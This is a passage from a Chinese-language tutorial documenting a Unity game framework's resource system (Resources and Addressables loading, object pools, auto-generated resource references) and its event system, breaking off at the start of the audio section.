<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据assetPath异步加载T类型资源</span>
<span class="hljs-comment">//(string assetPath, Action&lt;T&gt; callBack)</span>
ResSystem<span class="hljs-selector-class">.LoadAssetAsync</span>&lt;T&gt;(assetPath, callBack);
<span class="hljs-comment">//根据assetPath加载T类型资源</span>
ResSystem<span class="hljs-selector-class">.LoadAsset</span>&lt;T&gt;(assetPath);
<span class="hljs-comment">//加载指定路径的所有资源，返回object数组</span>
ResSystem<span class="hljs-selector-class">.LoadAssets</span>(assetPath);
<span class="hljs-comment">//加载指定路径的所有资源返回T类型</span>
ResSystem<span class="hljs-selector-class">.LoadAssets</span>&lt;T&gt;(assetPath);


<span class="hljs-comment">//简单示例，加载Resources下的clip音频资源</span>
ResSystem<span class="hljs-selector-class">.LoadAssets</span>&lt;AudioClip&gt;("Resources/clip");
</code></pre>
<ul>
<li>通过assetPath路径加载资源，T用来指明加载的资源类型。</li>
<li>异步加载资源需要通过传入callback回调获取加载的资源并进行使用。</li>
<li>加载所有资源时不指定T则返回object数组。</li>
<li>注意加载的资源不会被自动释放。</li>
</ul>
<h5 data-id="heading-26">卸载Asset</h5>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//卸载某个资源</span>
<span class="hljs-comment">//（UnityEngine.Object assetToUnload）</span>
ResSystem<span class="hljs-selector-class">.UnloadAsset</span>(assetToUnload);
<span class="hljs-comment">//卸载所有资源</span>
ResSystem<span class="hljs-selector-class">.UnloadUnusedAssets</span>();
</code></pre>
<p>卸载资源实际指释放内存中的asset。</p>
<p>对象池是帮做资源回收利用的，避免频繁GC，对象池管理不了Asset资源。而释放是资源不用了也不需要回收卸载掉就行了，GO的自动释放资源系统已经做好了，Asset需要你根据自己的需求来释放，因为Asset也没有生命周期，只能自己释放。</p>
<h3 data-id="heading-27">Addressables版本</h3>
<h4 data-id="heading-28">普通类对象(obj)</h4>
<p>类对象资源不涉及异步加载、Resources和Addressables的区别，直接走对象池系统，。</p>
<h5 data-id="heading-29">初始化</h5>
<p>资源系统的底层基于对象池系统，所以在资源系统层面也开放对对象池的初始化设置，API和PoolSystem一致。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName初始化OP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity, defaultQuanity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName);
<span class="hljs-comment">//根据T的类型名初始化OP</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity, defaultQuanity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;();
<span class="hljs-comment">//根据keyName初始化OP，不考虑默认容量，无需传T</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName);
<span class="hljs-comment">//根据type类型名初始化OP</span>
<span class="hljs-comment">//System.Type type, int maxCapacity = -1</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(type, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(type);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个Data数据类对象池，最大容量30,默认填满</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;("myData",<span class="hljs-number">30</span>,<span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;(<span class="hljs-number">30</span>, <span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(xx.GetType());
</code></pre>
<ul>
<li>通过keyName或者直接传入T根据T的类型名指定对象池的名字。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过T和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动生成T类型的对象放入对象池）。</li>
<li>泛型T起两个作用，一个是不指定keyName时用于充当type名称，另一个是进行默认容量设置时指定预先放入对象池的对象类型，所以如果不想用默认容量功能可以使用不传T的API。</li>
<li>maxCapacity, prefab, defaultQuantity可不填，默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
<li>只有有泛型参数的重载方法可以进行默认容量的初始化（需要指定泛型T进行类型转换）。</li>
<li>可以选择通过传入某个实例的type类型，初始化同名的无限容量OP。</li>
</ul>
<h5 data-id="heading-30">obj加载</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName从对象池中获取一个T类型对象，没有则new</span>
<span class="hljs-comment">//string keyName</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">T</span>&gt;(keyName);
<span class="hljs-comment">//根据T类型名从对象池中获取一个T类型对象，没有则new</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">T</span>&gt;();


<span class="hljs-comment">//简单示例,获取Data数据类的一个对象</span>
<span class="hljs-type">GameObject</span> go1 <span class="hljs-operator">=</span> <span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">Data</span>&gt;(<span class="hljs-string">"Data"</span>);
</code></pre>
<ul>
<li>通过keyName指定加载的类对象名，不填keyName则按照T的类型名加载。</li>
</ul>

<ul>
<li>加载时优先通过对象池获取，如果对象池中无对应资源，自动new一个类对象返回，保证返回值不为null。</li>
</ul>
<h5 data-id="heading-31">obj卸载</h5>
<p>卸载obj即将obj放回对象池进行资源回收。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName/obj类型名将obj放回对象池</span>
<span class="hljs-comment">//object obj, string keyName</span>
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(obj);
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(obj, string keyName);


<span class="hljs-comment">//简单示例，卸载Data类的对象data</span>
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(data, "Data");
</code></pre>
<ul>
<li>通过obj指定卸载的对象，keyName指定对象池名，不填则按照obj的类型名卸载。</li>
</ul>

<ul>
<li>卸载对象时如果没有初始化过对象池，则对应自动创建一个同名无限量对象池并将obj放入。</li>
</ul>
<h4 data-id="heading-32">游戏对象（GameObject）</h4>
<h5 data-id="heading-33">初始化</h5>
<p>资源系统的底层基于对象池系统，所以在资源系统层面也开放对对象池的初始化设置，API和PoolSystem有区别，Addressables版本通过Addressables name来获取prefab（参考副本），Res需要传路径来获取prefab（参考副本）。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName初始化GOP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, string assetName = null, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForKeyName</span>(keyName, maxCapacity,assetName, defaultQuantity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForKeyName</span>(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForKeyName</span>(keyName);
<span class="hljs-comment">//根据assetName在Addressables中的资源名初始化GOP</span>
<span class="hljs-comment">//(string assetName, int maxCapacity = -1, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForAssetName</span>(assetName, maxCapacity, defaultQuantity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForAssetName</span>(assetName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPoolForAssetName</span>(assetName);




<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个子弹Bullet对象池（假设Addressable资源名称为Bullet），最大容量30,默认填满</span>
Gameobject bullet = GameObject<span class="hljs-selector-class">.Find</span>("bullet");
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>("Bullet", <span class="hljs-number">30</span>, bullet, <span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(bullet, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>);


<span class="hljs-comment">//最简形式</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(“对象池名字”);
</code></pre>
<ul>
<li>通过keyName或者直接传入assetName（Addressable资源的名称）根据获取的资源名指定对象池的名字，优先keyName，没有keyName则使用assetName。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过assetName和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动加载GameObject放入对象池）。</li>
<li>默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
</ul>
<h5 data-id="heading-34">GameObject加载并实例化</h5>
<p>Addressable版本中游戏物体参数通过Addressable资源名assetName（Res是资源路径assetPath）指定，支持加载出的对象Destroy时在Addressables中自动释放。</p>
<pre><code class="hljs language-ini" lang="ini">//API
//加载游戏物体
//(string assetName, Transform <span class="hljs-attr">parent</span> = null, string keyName = null, bool autoRelease = <span class="hljs-literal">true</span>)
ResSystem.InstantiateGameObject(assetName, parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetName, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetName, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(parent, keyName)<span class="hljs-comment">;</span>
//加载游戏物体并获取组件T
ResSystem.InstantiateGameObject&lt;T&gt;(assetName, parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetName, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetName, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(parent, keyName)<span class="hljs-comment">;</span>
//异步加载(void)游戏物体
//(string assetName, Action&lt;GameObject&gt; <span class="hljs-attr">callBack</span> = null, Transform parent = null, string keyName = null, bool autoRelease = <span class="hljs-literal">true</span>)
ResSystem.InstantiateGameObjectAsync(assetName, callBack, parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetName, callBack, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetName, callBack, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetName, callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetName)<span class="hljs-comment">;</span>
//异步加载(void)游戏物体并获取组件T
//(string assetName, Action&lt;T&gt; <span class="hljs-attr">callBack</span> = null, Transform parent = null, string keyName = null, bool autoRelease = <span class="hljs-literal">true</span>)
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack, parent, keyName, autoRelease)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName, callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetName)<span class="hljs-comment">;</span>


//简单示例
//实例化一个子弹对象（假设AB资源名称为Bullet）
GameObject <span class="hljs-attr">bullet</span> = ResSystem.InstantiateGameObject(<span class="hljs-string">"Bullet"</span>)<span class="hljs-comment">;</span>
//实例化一个子弹对象取出并获取其刚体组件
Rigbody <span class="hljs-attr">rb</span> = ResSystem.InstantiateGameObject&lt;Rigbody&gt;(<span class="hljs-string">"Bullet"</span>)<span class="hljs-comment">;</span>
//异步实例化一个子弹对象,并在其加载完后坐标归零
void getBullet(GameObject bullet)
{
    <span class="hljs-attr">bullet.transform.position</span> = Vector3.zero<span class="hljs-comment">;</span>
    }
ResSystem.InstantiateGameObjectAsync("Bullet", getBullet)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>通过assetName加载游戏物体并实例化返回</li>
<li>实例化的游戏物体会设置父物体为parent，不填则默认为null无父物体在最顶层。</li>
<li>实例化的物体名称优先为keyName，keyName为null时则为assetName。</li>
<li>优先根据keyName从对象池获取，不填keyName则根据assetName在对象池中查找。</li>
<li>对象池中无缓存，则根据assetName从Addressable中获取资源,不填assetName则根据keyName从Addressable中获取资源。</li>
<li>可以通过传参获取对象上的某个组件，组件依托于GameObject存在，因此物体此时也已被从对象池中取出。</li>
<li>autoRelease为true则通过事件工具为加载出的对象添加事件监听，会在其Destroy时自动调用Addressables的Release API。</li>
<li>异步加载游戏物体及其组件的方法返回值为void类型，无法即时直接加载的游戏物体，需要通过callback回调获取加载的GameObject对象并进行使用。</li>
</ul>

<ul>
<li>如果资源路径正确，则返回值必不为空，优先从对象池中获取，对象池中不存在则根据Load的对象进行实例化返回。</li>
</ul>
<h5 data-id="heading-35">GameObject卸载</h5>
<p>卸载GameObject即将GameObject放回对象池进行资源回收。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName/gameObject.name卸载gameObject</span>
<span class="hljs-comment">//(string keyName, GameObject gameObject)</span>
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(keyName, gameObject);
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(gameObject);


<span class="hljs-comment">//简单示例，卸载子弹对象bullet</span>
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(bullet, "Bullet");
</code></pre>
<ul>
<li>通过gameObject指定卸载的对象，keyName指定对象池名，不填则按照gameObject的对象名卸载。</li>
</ul>

<ul>
<li>卸载对象时如果没有初始化过对象池，则对应自动创建一个同名无限量对象池并将gameObject放入。</li>
</ul>
<p>‍</p>
<h4 data-id="heading-36">Unity资源</h4>
<p>这类资源不需要进行实例化，所以不需要过对象池，只需要使用数据或者引用，比如AudioClip，Sprite，prefab(没有经过实例化的GameObject原本)。</p>
<h5 data-id="heading-37">加载Asset</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">//API</span>


<span class="hljs-comment">//根据assetName加载T类型资源</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAsset</span>&lt;<span class="hljs-type">T</span>&gt;(assetName);
<span class="hljs-comment">//根据keyName批量加载所有资源(IList&lt;T&gt;)</span>
<span class="hljs-comment">//(string keyName, out AsyncOperationHandle&lt;IList&lt;T&gt;&gt; handle, Action&lt;T&gt; callBackOnEveryOne = null)</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAssets</span>&lt;<span class="hljs-type">T</span>&gt;(keyName, handle, callBackOnEveryOne);


<span class="hljs-comment">//根据assetName异步加载T类型资源（void）</span>
<span class="hljs-comment">//(string assetName, Action&lt;T&gt; callBack)</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAssetAsync</span>&lt;<span class="hljs-type">T</span>&gt;(string assetName, <span class="hljs-type">Action</span>&lt;<span class="hljs-type">T</span>&gt; callBack);
<span class="hljs-comment">//根据keyName批量异步加载所有资源（void）</span>
<span class="hljs-comment">//(string keyName, Action&lt;AsyncOperationHandle&lt;IList&lt;T&gt;&gt;&gt; callBack, Action&lt;T&gt; callBackOnEveryOne = null)</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAssetsAsync</span>&lt;<span class="hljs-type">T</span>&gt;(keyName, callBack, callBackOnEveryOne);


<span class="hljs-comment">//简单示例，加载Addressable clip音频资源</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">LoadAssets</span>&lt;<span class="hljs-type">AudioClip</span>&gt;(<span class="hljs-string">"clip"</span>);
</code></pre>
<ul>
<li>通过path路径加载资源，T用来指明加载的资源类型。</li>
<li>异步加载单个资源需要通过传入callback回调获取加载的资源并进行使用。</li>
<li>批量加载资源时keyName是Addressable中的Labels。</li>
<li>handle用于释放资源,批量加载时，如果释放资源要释放掉handle，直接去释放资源是无效的.</li>
<li>Addressable加载指定keyName的所有资源时，支持每加载一个资源调用一次callBackOnEveryOne。</li>
<li>异步加载完指定keyName所有资源时，调用callback获取加载的资源集合并进行使用。</li>
<li>注意加载的资源不会被自动释放。</li>
</ul>
<h5 data-id="heading-38">卸载Asset</h5>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//释放某个资源</span>
<span class="hljs-comment">//（T obj）</span>
ResSystem<span class="hljs-selector-class">.UnloadAsset</span>&lt;T&gt;(T obj);
<span class="hljs-comment">//销毁对象并释放资源</span>
<span class="hljs-comment">//(GameObject obj)</span>
ResSystem<span class="hljs-selector-class">.UnloadInstance</span>(obj);
<span class="hljs-comment">//卸载因为批量加载而产生的handle</span>
<span class="hljs-comment">//(AsyncOperationHandle&lt;TObject&gt; handle)</span>
UnLoadAssetsHandle&lt;TObject&gt;(handle);
</code></pre>
<p>卸载Asset即释放资源,可以在Destroy游戏对象的同时释放Addressable资源。</p>
<h3 data-id="heading-39">资源系统-自动生成资源引用代码</h3>
<p>针对Addressables版本，使用字符串来加载资源方式比较麻烦，而且容易输错，框架提供一种基于引用加载的方式。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bab11f7f3e5c42f1aaad7325eea63c0a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=fN58fhRyZsauxE4k5DOeBD7pk14%3D" alt="alt" loading="lazy"/>​</p>
<p>通过Editor工具会在指定路径下生成资源引用代码R。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5bc542d6844e459ab2a85b57e7254597~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=iXbOuV6ttrAaepIur0WIMFsfImU%3D" alt="alt" loading="lazy"/>​</p>
<pre><code class="hljs language-ini" lang="ini">// API
//返回一个资源
R.GroupName.AddressableName<span class="hljs-comment">;</span>
//返回一个资源的实例
//(Transform <span class="hljs-attr">parent</span> = null,string keyName=null,bool autoRelease = <span class="hljs-literal">true</span>)
R.GroupName.AddressableName(parent, keyName, autoRelease)<span class="hljs-comment">;</span>
R.GroupName.AddressableName(parent, keyName)<span class="hljs-comment">;</span>
R.GroupName.AddressableName(parent)<span class="hljs-comment">;</span>


//使用示例
//获取一个Bullet预制体资源（不实例化）
Gameobject <span class="hljs-attr">bullet</span> = R.DefaultLocalGroup.Bullet<span class="hljs-comment">;</span>
//获取一个Bullet实例
Gameobject <span class="hljs-attr">bullet</span> = R.DefaultLocalGroup.Bullet(x.transform)<span class="hljs-comment">;</span>


//释放
ResSystem.UnloadAsset&lt;GameObject&gt;(bullet)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>R是资源脚本的命名空间，固定。</li>
<li>GroupName是Addressable的组名。</li>
<li>AddressableName是资源名。</li>
<li>如果填写keyName，则先去对象池中找资源实例，找不着再通过Addressable获取资源并实例化。</li>
<li>parent为实例的父物体。</li>
<li>autoRelease为true则实例会在Destroy时自动释放Addressable中对应的资源。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ad41d5d404cc4a3ab4fcad22fc96e27e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=GiU2cfnk1Kny%2B2NZSBQ1einzv4A%3D" alt="alt" loading="lazy"/>​</p>
<p>对于Sprite的子图，也支持直接引用。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/143b3a4bc26140dda4d9a66fee56ce80~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=k6KcNqYYuf2Z1lsi8WchOS%2BsnTc%3D" alt="alt" loading="lazy"/>​</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//子图</span>
R.LV2.Img_Img_0;
<span class="hljs-comment">//总图</span>
R.Lv2.Img;
</code></pre>
<h2 data-id="heading-40">事件系统</h2>
<p>框架的事件系统主要负责高效的方法调用与数据传递，实现各功能之间的解耦，通常在调用某个实例的方法时，必须先获得这个实例的引用或者新实例化一个对象，低耦合度的框架结构希望程序本身不去关注被调用的方法所依托的实例对象是否存在，通过事件系统做中转将功能的调用封装成事件，使用事件监听注册、移除和事件触发完成模块间的功能调用管理。常用在UI事件、跨模块事件上。</p>
<p>事件系统支持无返回值的Action，Func实际应用意义不大。</p>
<h3 data-id="heading-41">事件监听添加</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//添加无参数的事件监听</span>
<span class="hljs-comment">//string eventName, Action action</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>(eventName, action); 
<span class="hljs-comment">//添加多个参数的事件监听</span>
<span class="hljs-comment">//string eventName</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;T&gt;(eventName, action);
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;T0, T1&gt;(eventName, action);
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;T0, T1, T2&gt;(eventName, action);
...
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;T0, T1, ..., T15&gt;(eventName, action);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//添加无参数的事件监听,Doit方法对应名称为Test的事件</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>("Test", Doit);
void <span class="hljs-built_in">Doit</span>()
{
    Debug<span class="hljs-selector-class">.Log</span>("Doit");
}
<span class="hljs-comment">//添加多个参数的事件监听，Doit2对应名称为TestM的事件，参数为int，string</span>
EventSystem<span class="hljs-selector-class">.AddEventListener</span>&lt;int, string&gt;("TestM", Doit2);
void <span class="hljs-built_in">Doit2</span>(int a, string b)
{
    Debug<span class="hljs-selector-class">.Log</span>(a);
    Debug<span class="hljs-selector-class">.Log</span>(b); 
}
</code></pre>
<ul>
<li>eventName是解耦执行的方法的标记，即事件名，是触发事件时的唯一依据。</li>
<li>action传无返回值方法。</li>
<li>T0~T15是泛型，用于指定参数表,支持最多16个参数的action。</li>
</ul>
<h3 data-id="heading-42">事件监听移除</h3>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//添加无参数的事件监听</span>
<span class="hljs-comment">//string eventName, Action action</span>
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>(eventName, action); 
<span class="hljs-comment">//添加多个参数的事件监听</span>
<span class="hljs-comment">//string eventName</span>
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T&gt;(eventName, action);
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T0, T1&gt;(eventName, action);
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T0, T1, T2&gt;(eventName, action);
...
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;T0, T1, ..., T15&gt;(eventName, action);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//移除无参数的事件监听,Doit方法对应名称为Test的事件</span>
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>("Test", Doit);
void <span class="hljs-built_in">Doit</span>()
{
    Debug<span class="hljs-selector-class">.Log</span>("Doit");
}
<span class="hljs-comment">//移除多个参数的事件监听，Doit2对应名称为TestM的事件，参数为int，string</span>
EventSystem<span class="hljs-selector-class">.RemoveEventListener</span>&lt;int, string&gt;("TestM", Doit2);
void <span class="hljs-built_in">Doit2</span>(int a, string b)
{
    Debug<span class="hljs-selector-class">.Log</span>(a);
    Debug<span class="hljs-selector-class">.Log</span>(b); 
}
</code></pre>
<ul>
<li>eventName是解耦执行的方法的标记，即事件名，是触发事件时的唯一依据。</li>
<li>action传无返回值方法。</li>
<li>T0~T15是泛型，用于指定参数表,支持最多16个参数的action。</li>
</ul>
<h3 data-id="heading-43">事件触发</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//触发无参数事件</span>
EventSystem.EventTrigger(<span class="hljs-built_in">string</span> eventName);
<span class="hljs-comment">//触发多个参数事件</span>
EventSystem.EventTrigger&lt;T&gt;(<span class="hljs-built_in">string</span> eventName, T arg);
EventSystem.EventTrigger&lt;T0, T1&gt;(<span class="hljs-built_in">string</span> eventName, T0 arg0, T1 arg1);
EventSystem.EventTrigger&lt;T0, T1,..., T15&gt;(<span class="hljs-built_in">string</span> eventName, T0 arg0, T1 arg1, ..., T15 arg15);
 
<span class="hljs-comment">//简单示例，使用添加监听的方法例子</span>
EventSystem.EventTrigger(<span class="hljs-string">"Test"</span>);
EventSystem.EventTrigger&lt;<span class="hljs-type">int</span>,<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"TestM"</span>,<span class="hljs-number">1</span>,<span class="hljs-string">"test"</span>);
</code></pre>
<ul>
<li>eventName是解耦执行的方法的标记，即事件名，是触发事件时的唯一依据。</li>
<li>T0~T15是泛型，用于指定参数表,支持最多16个参数的action。</li>
<li>事件的查询底层使用TryGetValue所以触发不存在的事件并不会报错。</li>
</ul>
<h3 data-id="heading-44">事件移除</h3>
<p>事件移除和事件监听移除的区别参与：</p>
<ul>
<li>事件监听移除只移除一条Action，比如添加了3次同名事件监听，则移除一次后触发还是会执行两次，且eventName记录不会被移除。</li>
<li>事件移除会将事件中心字典中有关eventName的记录连带存储的Action一同清空。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//移除一类事件</span>
<span class="hljs-comment">//(string eventName)</span>
EventSystem<span class="hljs-selector-class">.RemoveEvent</span>(eventName);
<span class="hljs-comment">//移除事件中心中所有事件</span>
EventSystem<span class="hljs-selector-class">.Clear</span>();
</code></pre>
<ul>
<li>eventName是解耦执行的方法的标记，即事件名，是触发事件时的唯一依据。</li>
</ul>
<h3 data-id="heading-45">类型事件</h3>
<p>支持对参数进行封装为一个struct传递，简化参数列表。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//添加类型事件的监听</span>
<span class="hljs-comment">//Action&lt;T&gt; action</span>
AddTypeEventListener&lt;T&gt;(action);
<span class="hljs-comment">//移除类型事件的监听</span>
RemoveTypeEventListener&lt;T&gt;(action);
<span class="hljs-comment">//移除/删除一个类型事件</span>
RemoveTypeEvent&lt;T&gt;();
<span class="hljs-comment">//触发类型事件</span>
<span class="hljs-comment">// (T arg)</span>
TypeEventTrigger&lt;T&gt;(arg);
</code></pre>
<ul>
<li>T是封装的参数列表，一般为struct类型。</li>
<li>action设计使用封装参数T的事件。</li>
<li>arg是封装的参数。</li>
</ul>
<h3 data-id="heading-46">注意</h3>
<p>事件系统的运行逻辑是，预先添加/移除事件监听，再在能够获取相应参数的类内触发事件。</p>
<h2 data-id="heading-47">音效系统</h2>
<p>音效服务集成了背景、特效音乐播放，音量、播放控制功能。包含了全局音量globalVolume、背景音量bgVolume、特效音量effectVolume、静音布尔量isMute、暂停布尔量isPause等音量相关的属性，播放背景音乐的PlayBGAudio方法且，播放特效音乐PlayOnShot方法且重载后支持在指定位置或绑定游戏对象播放特定的音乐，特效音乐由于要重复使用，可以从对象池中获取播放器并自动回收，支持播放后执行回调事件。</p>
<h3 data-id="heading-48">播放背景音乐</h3>
<h3 data-id="heading-49">音量、播放属性控制</h3>
<p>音效服务支持在Inspector面板上的值发生变化时自动执行相应的方法更新音量属性,也可以在属性值变化时自动调用相应的更新方法。</p>
<pre><code class="hljs language-ini" lang="ini">//API &amp; 示例
//全局音量(float,0~1),音量设定为50%
